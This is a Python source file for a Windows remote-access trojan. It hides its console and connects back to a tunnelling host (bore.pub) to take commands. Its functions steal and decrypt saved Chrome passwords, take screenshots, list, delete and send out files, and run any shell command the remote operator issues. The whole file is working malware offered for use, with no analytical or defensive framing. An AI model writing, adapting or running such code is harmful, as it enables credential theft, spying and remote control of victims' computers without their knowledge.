import socket
import subprocess
import os
import sys
import time
import mss
from PIL import Image
import shutil
import win32crypt
import sqlite3
import ctypes
import random
import string

# ================= CONFIG =================
HOST = 'bore.pub'
PORT = 48911
# =========================================

def hide_console():
    if sys.platform == "win32":
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

def random_string(length=12):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def chrome_stealer():
    try:
        path = os.path.join(os.getenv("LOCALAPPDATA"), r"Google\Chrome\User Data\Default\Login Data")
        if not os.path.exists(path):
            return "[-] No Chrome data"

        temp_db = "temp_" + random_string(8) + ".db"
        shutil.copy2(path, temp_db)
        
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        results = cursor.fetchall()

        data = "\n=== Saved Credentials ===\n\n"
        count = 0
        for url, user, enc_pass in results:
            if user and enc_pass:
                try:
                    passw = win32crypt.CryptUnprotectData(enc_pass, None, None, None, 0)[1].decode('utf-8')
                    data += f"Site : {url}\nUser : {user}\nPass : {passw}\n" + "-"*50 + "\n\n"
                    count += 1
                except:
                    pass
        conn.close()
        os.remove(temp_db)
        return data if count > 0 else "[-] No passwords found"
    except:
        return "[-] Stealer failed"

def list_files(path="."):
    try:
        items = []
        for item in os.listdir(path):
            full = os.path.join(path, item)
            size = os.path.getsize(full) if os.path.isfile(full) else 0
            items.append(f"{'[D]' if os.path.isdir(full) else '[F]'} {item} ({size}b)")
        return "\n".join(items) if items else "Empty"
    except:
        return "Access denied"

def connect():
    hide_console()
    
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((HOST, PORT))
            
            while True:
                cmd = s.recv(8192).decode('utf-8', errors='ignore').strip()
                if not cmd:
                    continue

                try:
                    if cmd.lower() == "screenshot":
                        with mss.mss() as sct:
                            img = sct.grab(sct.monitors[1])
                            img_pil = Image.frombytes('RGB', img.size, img.rgb)
                            img_pil.save("t.png", quality=40, optimize=True)
                        
                        with open("t.png", "rb") as f:
                            s.sendall(f.read())
                        s.send(b'END_SCREEN')
                        os.remove("t.png")

                    elif cmd.lower() == "chrome":
                        s.send(chrome_stealer().encode('utf-8', errors='ignore'))

                    elif cmd.lower() == "sysinfo":
                        info = f"User:{os.getlogin()}\nPC:{os.getenv('COMPUTERNAME')}\nIP:{socket.gethostbyname(socket.gethostname())}"
                        s.send(info.encode())

                    elif cmd.lower().startswith("list"):
                        folder = cmd.split(" ", 1)[1] if " " in cmd else "."
                        s.send(list_files(folder).encode('utf-8', errors='ignore'))

                    elif cmd.lower().startswith("delete "):
                        p = cmd.split(" ", 1)[1]
                        if os.path.exists(p):
                            os.remove(p)
                            s.send(b'[+] Deleted')
                        else:
                            s.send(b'[-] Not found')

                    elif cmd.lower().startswith("download "):
                        p = cmd.split(" ", 1)[1]
                        if os.path.exists(p) and os.path.isfile(p):
                            with open(p, "rb") as f:
                                s.sendall(f.read())
                            s.send(b'END_FILE')
                        else:
                            s.send(b'[-] Not found')

                    else:
                        out = subprocess.getoutput(cmd)
                        s.send((out if out else "[+] OK").encode('utf-8', errors='ignore'))

                except:
                    s.send(b'[-] Error')

        except:
            time.sleep(10)

if __name__ == "__main__":
    connect()